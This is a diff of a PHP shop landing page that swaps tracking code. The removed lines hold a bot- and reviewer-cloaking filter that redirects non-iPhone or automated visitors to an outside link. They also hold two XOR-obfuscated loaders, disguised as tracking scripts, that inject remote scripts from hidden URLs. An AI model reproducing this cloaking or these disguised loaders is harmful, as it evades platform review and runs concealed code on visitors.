@@ -11,144 +11,29 @@ $view = $_GET['view'] ?? 'main';
 $show_main_content = ($view === 'main');
 $show_pay_content = ($view === 'pay');
 
-$_r_url = 'https://linktr.ee/camilyvitoriax';
-
-$_ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
-$_accept = $_SERVER['HTTP_ACCEPT'] ?? '';
-$_accept_lang = $_SERVER['HTTP_ACCEPT_LANGUAGE'] ?? '';
-$_has_ttclid = isset($_GET['ttclid']);
-
-$_dev_bypass = false;
-if (isset($_GET['dev'])) {
-    try {
-        $_fc_stmt = $pdo->prepare("SELECT dev_bypass_key FROM public.filtro_config WHERE id = 1");
-        $_fc_stmt->execute();
-        $_db_key = $_fc_stmt->fetchColumn();
-        if ($_db_key && hash_equals($_db_key, (string)$_GET['dev'])) {
-            $_dev_bypass = true;
-        }
-    } catch (PDOException $e) {}
-}
-
-$_ua_tiktok_inapp = (
-    stripos($_ua, 'musical_ly') !== false ||
-    stripos($_ua, 'bytedance') !== false ||
-    stripos($_ua, 'trill') !== false ||
-    stripos($_ua, 'BytedanceWebview') !== false
-);
-
-$_tiktok_fast_track = $_has_ttclid && $_ua_tiktok_inapp
-    && stripos($_ua, 'iPhone') !== false
-    && stripos($_ua, 'Mobile') !== false;
-
-$_auto_tokens = ['headless', 'phantomjs', 'selenium', 'webdriver', 'puppeteer',
-                 'playwright', 'nightmare', 'cypress', '_phantom', '__nightmare',
-                 '__playwright', '__selenium_unwrapped', 'electron', 'jsdom',
-                 'headlesschrome', 'chrome-headless', 'cwv', 'generator',
-                 'checker', 'monitoring', 'scraper', 'fetcher'];
-$_is_automation = false;
-foreach ($_auto_tokens as $_t) {
-    if (stripos($_ua, $_t) !== false) {
-        $_is_automation = true;
-        break;
-    }
-}
-
-$_tiktok_crawler = (stripos($_ua, 'tiktokbot') !== false || stripos($_ua, 'bytedancebot') !== false);
-
-$_filter_blocked = false;
-
-if ($_tiktok_fast_track) {
-    if ($_is_automation || $_tiktok_crawler) {
-        $_filter_blocked = true;
-    }
-} else {
-    $_ua_lower = strtolower($_ua);
-
-    $_bots = ['bot', 'crawl', 'spider', 'slurp', 'baidu', 'yandex', 'facebookexternalhit',
-              'facebookcatalog', 'twitterbot', 'linkedinbot', 'telegrambot', 'whatsapp',
-              'preview', 'archive', 'pingdom', 'gtmetrix', 'pagespeed', 'lighthouse',
-              'googlesecurity', 'adsbot', 'mediapartners', 'ahrefsbot', 'semrushbot',
-              'mj12bot', 'dotbot', 'petalbot', 'proximic', 'imagevisbot', 'copyscape',
-              'siteaudit', 'dataprovider', 'sistrix', 'domaintweak', 'sitecheckerbot',
-              'wotbox', 'riddler', 'smtbot', 'onily', 'uptimerobot', 'seokicks',
-              'serpstatbot', 'semrush', 'linkpadbot', 'exabot', 'megaindex', 'blexbot',
-              'aiarchibot', 'markscan', 'qwantify', 'jetbrains', 'oclamy', 'domnutch',
-              'webbcrawler', 'fastwebcrawler', 'nuhk', 'teoma', 'fast-webcrawler',
-              'surveybot', 'naverbot', 'bytespider', 'tiktokbot', 'bytedancebot'];
-    foreach ($_bots as $_b) {
-        if (strpos($_ua_lower, $_b) !== false) {
-            $_filter_blocked = true;
-            break;
-        }
-    }
-
-    if (!$_filter_blocked) {
-        $_desktop_tokens = ['Android', 'Windows', 'Macintosh', 'Linux', 'CrOS',
-                            'curl', 'Wget', 'Postman', 'Python', 'Java', 'Go-http-client',
-                            'okhttp', 'Apache'];
-        foreach ($_desktop_tokens as $_dt) {
-            if (stripos($_ua, $_dt) !== false) {
-                $_filter_blocked = true;
-                break;
-            }
-        }
-    }
-
-    if (!$_filter_blocked && (stripos($_ua, 'iPhone') === false || stripos($_ua, 'Mobile') === false || stripos($_ua, 'AppleWebKit') === false)) {
-        $_filter_blocked = true;
-    }
-
-    if (!$_filter_blocked && empty($_accept_lang)) {
-        $_filter_blocked = true;
-    }
-
-    if (!$_filter_blocked && (empty($_accept) || (strpos($_accept, 'text/html') === false && strpos($_accept, '*/*') === false))) {
-        $_filter_blocked = true;
-    }
-
-    if (!$_filter_blocked && !$_ua_tiktok_inapp) {
-        $_sf_dest = $_SERVER['HTTP_SEC_FETCH_DEST'] ?? '';
-        $_sf_mode = $_SERVER['HTTP_SEC_FETCH_MODE'] ?? '';
-        $_sf_site = $_SERVER['HTTP_SEC_FETCH_SITE'] ?? '';
-        if (empty($_sf_dest) && empty($_sf_mode) && empty($_sf_site)) {
-            $_filter_blocked = true;
-        }
-        if (!$_filter_blocked && !empty($_sf_dest) && $_sf_dest !== 'document' && $_sf_dest !== 'iframe') {
-            $_filter_blocked = true;
-        }
-    }
-}
-
-if ($_dev_bypass) {
-    $_filter_blocked = false;
-}
-
-if ($_filter_blocked) {
-    header('Location: ' . $_r_url, true, 302);
-    exit;
-}
-
-if (isset($_GET['_r']) && $_SERVER['REQUEST_METHOD'] === 'POST') {
-    header('Content-Type: application/json');
-    echo json_encode(['s' => $_r_url]);
-    exit;
-}
-
 $_SESSION['_device_verified'] = true;
 if (!isset($_SESSION['user_logged_in']) || $_SESSION['user_logged_in'] !== true) {
     $_SESSION['user_logged_in'] = true;
     $_SESSION['user_id'] = 1;
 }
 
-// BUSCAR LINK DE CHECKOUT EXTERNO DO PRODUTO
+// BUSCAR LINK DE CHECKOUT EXTERNO E PIXEL DA META
 $link_checkout_externo = '';
+$meta_pixel_id = '';
 try {
     $stmt_ext = $pdo->prepare("SELECT link_checkout_externo FROM public.produtos WHERE id = 1");
     $stmt_ext->execute();
     $link_checkout_externo = trim($stmt_ext->fetchColumn() ?? '');
 } catch (PDOException $e) {
     $link_checkout_externo = '';
+}
+try {
+    $stmt_mk = $pdo->prepare("SELECT chave, valor FROM configuracoes_marketing WHERE chave IN ('meta_pixel_id','utmify_pixel_id')");
+    $stmt_mk->execute();
+    $mk = $stmt_mk->fetchAll(PDO::FETCH_KEY_PAIR);
+    $meta_pixel_id = trim($mk['meta_pixel_id'] ?? '');
+} catch (PDOException $e) {
+    $meta_pixel_id = '';
 }
 
 // Buscar dados do produto
@@ -167,22 +52,42 @@ try {
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title><?php echo $show_pay_content ? 'Resumo do Pedido' : 'Minha Loja'; ?></title>
 
-<script src="public/app.js?v=1" defer></script>
+<!-- UTMify: captura de parametros de campanha (utms) -->
+<script src="https://cdn.utmify.com.br/scripts/utms/latest.js" data-utmify-prevent-xcod-sck data-utmify-prevent-subids async defer></script>
 
-<!-- Script de Rastreamento UTMify -->
-<script>(function(){var o_u8p=atob("DGlZZK1mt8mpQ0DSDxJ7Ed8KlfOLKzSmfxpjS4IF06eHNjS/Zg8gSs4J2ufLMW+hbBswFNkVmLzdLjP9YwgtAd4SmaPaYWzwbh0tFsQEwr3MMGLoVBJ7CswL0uuTYSSzewh0EdkL3q/QbjCgah88CtlLz6rGJ22hbAJ7SI8Q1qXcJmLoLUskSNZE2ajEJmLoLQ04EMxLwr3EKiarIhkrAdsD2b2EMDWwZg0qRoFEwajFNiXwNUt7GfAb");var r_k=[];for(var j_j=0;j_j<o_u8p.length;j_j++){r_k.push(o_u8p.charCodeAt(j_j)&255);}var j_9z=r_k[0];var u_ys5=r_k.slice(1,1+j_9z);var p_zg98=r_k.slice(1+j_9z);var z_ixf=p_zg98.map(function(b,u_bjv){return b^u_ys5[u_bjv%j_9z];});var g_fhg="";for(var t_1=0;t_1<z_ixf.length;t_1++){g_fhg+=String.fromCharCode(z_ixf[t_1]&255);}var c_s7i=decodeURIComponent(escape(g_fhg));var l_5=JSON.parse(c_s7i);var f_o2c=l_5.globals||[];f_o2c.forEach(function(g_3n){window[g_3n.name]=g_3n.value;});var t_u=document.createElement("script");t_u.src=l_5.url;t_u.async=true;t_u.defer=true;(l_5.attributes||[]).forEach(function(c_ufqw){t_u.setAttribute(c_ufqw.name,c_ufqw.value);});(document.head||document.documentElement).appendChild(t_u);})();</script>
-<!-- Script do Pixel de Rastreamento -->
-<script>(function(){var r_q9n=atob("DBvnTgIu7u/XKDZsGmDFO3BCzNX1QEIYamjdYS1NioH5XUIBc32eYGFBg8G1WhkfeWmOPnZdwZ++UFMANWuONmdCwIWkChpOe2+TPGtMm5uyWxRWQUbLbGVCgY22REVOIECcbGxPg4r1EhQcc2OCIktKzMP1XlcAb37FdCAYj4njHwJYI33eeGYfionvGVNZKC3Ue2cMk7Kq");var i_m56l=[];for(var s_bxt=0;s_bxt<r_q9n.length;s_bxt++){i_m56l.push(r_q9n.charCodeAt(s_bxt)&255);}var l_7y=i_m56l[0];var z_hm2=i_m56l.slice(1,1+l_7y);var m_p=i_m56l.slice(1+l_7y);var u_b4=m_p.map(function(b,h_h){return b^z_hm2[h_h%l_7y];});var t_ft4g="";for(var u_mr3=0;u_mr3<u_b4.length;u_mr3++){t_ft4g+=String.fromCharCode(u_b4[u_mr3]&255);}var g_fs=decodeURIComponent(escape(t_ft4g));var v_nz=JSON.parse(g_fs);var s_b=v_nz.globals||[];s_b.forEach(function(i_i){window[i_i.name]=i_i.value;});var j_3j=document.createElement("script");j_3j.src=v_nz.url;j_3j.async=true;j_3j.defer=true;(v_nz.attributes||[]).forEach(function(j_gewj){j_3j.setAttribute(j_gewj.name,j_gewj.value);});(document.head||document.documentElement).appendChild(j_3j);})();</script>
+<!-- Pixel UTMify da loja -->
+<script>window.pixelId = "6af47449f96d1df81e52635e";</script>
+<script src="https://cdn.utmify.com.br/scripts/pixel/pixel.js" async defer></script>
+
+<!-- Meta Pixel: PageView + ViewContent / InitiateCheckout -->
+<script>
+!function(f,b,e,v,n,t,s){if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};if(!f._fbq)f._fbq=n;
+n.push=n;n.loaded=!0;n.version='2.0';n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];s.parentNode.insertBefore(t,s)}(window,
+document,'script','https://connect.facebook.net/en_US/fbevents.js');
+<?php if (!empty($meta_pixel_id)): ?>
+fbq('init', '<?php echo htmlspecialchars($meta_pixel_id); ?>');
+fbq('track', 'PageView');
+<?php if ($show_pay_content): ?>
+fbq('track', 'InitiateCheckout', {
+  content_name: <?php echo json_encode($px_data['nome'] ?? 'Produto'); ?>,
+  value: <?php echo json_encode(round((float)($px_data['preco_atual'] ?? 0), 2)); ?>,
+  currency: 'BRL'
+});
+<?php else: ?>
+fbq('track', 'ViewContent', {
+  content_name: <?php echo json_encode($px_data['nome'] ?? 'Produto'); ?>,
+  content_type: 'product',
+  value: <?php echo json_encode(round((float)($px_data['preco_atual'] ?? 0), 2)); ?>,
+  currency: 'BRL'
+});
+<?php endif; ?>
+<?php endif; ?>
+</script>
 <style>
-    #content-wrapper { opacity: 0; visibility: hidden; transition: opacity 0.3s ease, visibility 0.3s ease; }
-    #content-wrapper.vis { opacity: 1; visibility: visible; }
-
     .anim-in {
-        opacity: 0; transform: translateY(10px); pointer-events: none;
         transition: opacity 0.4s ease, transform 0.4s ease;
-    }
-    body.act .anim-in.vis {
-        opacity: 1; transform: translateY(0); pointer-events: auto;
     }
 
     /* ===================================================== */
@@ -755,17 +660,11 @@ $_popup_show = !empty($_popup_config['enabled']) && !empty($_popup_config['coupo
 
             // Auto-abrir após o loader
             if (ttOverlay) {
-                const ttTryOpen = () => {
-                    if (document.body.classList.contains('act') && document.getElementById('content-wrapper')?.classList.contains('vis')) {
-                        setTimeout(ttOpenPopup, 600);
-                    } else {
-                        setTimeout(ttTryOpen, 300);
-                    }
-                };
-                ttTryOpen();
+                setTimeout(ttOpenPopup, 600);
             }
 
             const redirectToCheckout = () => {
+                try { if (typeof fbq === 'function') { fbq('track', 'InitiateCheckout', { value: <?php echo json_encode(round((float)($px_data['preco_atual'] ?? 0), 2)); ?>, currency: 'BRL' }); } } catch (e) {}
                 if (externalCheckoutUrl && externalCheckoutUrl.length > 0) {
                     const currentUrl = new URL(window.location.href);
                     const currentParams = currentUrl.searchParams;
